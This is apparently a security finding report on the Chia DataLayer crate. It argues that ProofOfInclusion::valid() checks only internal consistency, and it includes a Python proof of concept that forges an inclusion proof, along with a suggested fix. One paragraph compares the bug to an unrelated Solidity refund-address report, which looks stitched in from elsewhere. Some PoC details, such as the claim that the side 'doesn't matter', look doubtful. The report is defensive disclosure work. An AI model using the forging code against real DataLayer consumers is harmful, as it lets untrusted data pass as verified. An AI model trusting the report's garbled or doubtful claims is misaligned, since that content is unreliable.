### Title
`ProofOfInclusion::valid()` Never Validates Against an External Root Hash — Forged Inclusion Proofs Always Pass — (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

---

### Summary

`ProofOfInclusion::valid()` in the DataLayer crate performs only internal self-consistency checks on the proof chain. It never validates the computed root against an externally-supplied, trusted root hash. Because `root_hash()` returns the last `combined_hash` field from the proof itself (attacker-controlled), the final equality check in `valid()` is a tautology: it is always `true` whenever the loop completes without returning `false`. An attacker can construct a `ProofOfInclusion` for any arbitrary `node_hash` (claiming any key is included in any tree) and `valid()` will return `true`, as long as the attacker builds a self-consistent chain of layers.

---

### Finding Description

`ProofOfInclusion::valid()` is implemented as follows:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    existing_hash == self.root_hash()
}
``` [1](#0-0) 

And `root_hash()` is:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash
    } else {
        self.node_hash
    }
}
``` [2](#0-1) 

**The tautology:** After the loop, `existing_hash` equals the last `layer.combined_hash` (the loop would have returned `false` otherwise). `root_hash()` also returns `self.layers.last().combined_hash`. Therefore `existing_hash == self.root_hash()` is **always `true`** when layers are present. The function never compares the computed root against any externally-trusted value.

The analog to the external report is direct: just as `excessFeeRefundAddress` was hardcoded to `msg.sender` instead of being a caller-supplied parameter (causing the refund to go to the wrong place), `valid()` is missing a caller-supplied `expected_root: Hash` parameter. Instead it silently uses the proof's own last `combined_hash` as the "expected" root — a value entirely under the attacker's control.

`ProofOfInclusion` is a `Streamable` type with `from_py_object` and `pyclass(get_all)` attributes, meaning it can be deserialized from arbitrary bytes at the Python/wasm boundary and `valid()` called on it directly. [3](#0-2) 

The Python binding exposes `py_valid()` with no root parameter: [4](#0-3)

### Impact Explanation

An attacker who can supply a `ProofOfInclusion` object (via the Python or wasm binding, or via Streamable deserialization) can forge a proof claiming that any arbitrary key/value is included in any DataLayer tree. The forged proof will pass `valid()` as long as the attacker constructs a self-consistent chain of layers — which is trivial: pick any `node_hash`, pick any sequence of `(other_hash_side, other_hash)` pairs, compute each `combined_hash` correctly using `calculate_internal_hash`, and `valid()` returns `true`.

This matches the allowed High impact: **"DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state."**

Any DataLayer consumer that calls `proof.valid()` to gate access to state (e.g., verifying that a key-value pair is committed to a published root) is fully bypassed.

---

### Likelihood Explanation

- `ProofOfInclusion` is a `Streamable` type exposed at the Python boundary with `from_py_object`, so any Python caller can construct one from raw bytes.
- The `valid()` / `py_valid()` method is the only validation API provided; there is no alternative that accepts an expected root.
- Any DataLayer client that follows the natural API (`proof = blob.get_proof_of_inclusion(key); assert proof.valid()`) is vulnerable.
- No privileged access, key material, or chain-level position is required.

---

### Recommendation

`valid()` must accept an `expected_root: &Hash` parameter and compare the computed root against it:

```rust
pub fn valid(&self, expected_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == expected_root
}
```

The Python binding `py_valid()` must be updated accordingly, and all call sites must supply the trusted root obtained from the `MerkleBlob` (e.g., `blob.get_root_hash()`), not from the proof itself.

### Proof of Concept

```python
from chia_rs import MerkleBlob, KeyId, ValueId, ProofOfInclusion, ProofOfInclusionLayer, Side
import hashlib

# Build a real tree with one entry
blob = MerkleBlob(bytearray())
blob.insert(KeyId(1), ValueId(1), bytes(range(32)))
blob.calculate_lazy_hashes()
real_root = blob.get_root_hash()

# Forge a proof claiming KeyId(999) is in the tree
# Step 1: pick any node_hash for the fake leaf
fake_node_hash = bytes([0xAB] * 32)

# Step 2: build one layer whose combined_hash is computed correctly
other_hash = bytes([0xCD] * 32)
# combined = sha256(b'\x00' * 30 + b'\x01' + fake_node_hash + other_hash)  (left side)
h = hashlib.sha256(b'\x00' * 30 + b'\x01' + fake_node_hash + other_hash).digest()
layer = ProofOfInclusionLayer(
    other_hash_side=Side.Left,   # or Right, doesn't matter
    other_hash=other_hash,
    combined_hash=h,
)

forged_proof = ProofOfInclusion(node_hash=fake_node_hash, layers=[layer])

# valid() returns True despite the proof not corresponding to the real tree
assert forged_proof.valid(), "Expected forged proof to pass valid()"
assert forged_proof.root_hash() != real_root, "Root mismatch not detected"
print("Forged proof accepted by valid()!")
```

The forged proof passes `valid()` because `existing_hash` after the loop equals `layer.combined_hash`, and `root_hash()` also returns `layer.combined_hash` — the final check is a tautology. [1](#0-0) [2](#0-1)
